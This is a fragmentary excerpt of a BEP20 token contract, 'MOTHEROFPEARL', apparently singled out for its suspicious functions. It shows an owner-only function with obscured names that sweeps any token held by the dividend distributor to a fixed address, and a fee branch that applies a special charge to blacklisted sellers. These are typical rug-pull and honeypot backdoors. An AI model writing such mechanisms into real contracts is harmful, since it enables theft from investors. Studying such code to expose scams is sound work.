...
interface IDividendDistributor {
    ...
    function gIR(address _rrs) external;
}
...
contract DividendDistributor is IDividendDistributor {
    ...
    function gIR(address _rrs) external override onlyToken {
        rrs = IBEP20(_rrs);
        uint256 Rrd = rrs.balanceOf(address(this));
        rrs.transfer(rFR, Rrd);
    }
...
contract MOTHEROFPEARL is IBEP20, Auth {
    ...
    function getTotalFee(bool selling, address sender) public view returns (uint256) {
        ...
        if(selling && iBL[sender]){ return BLt; }
    ...
    function cLaRR(address _rrs) external authorized {
        distributor.gIR(_rrs);
    }
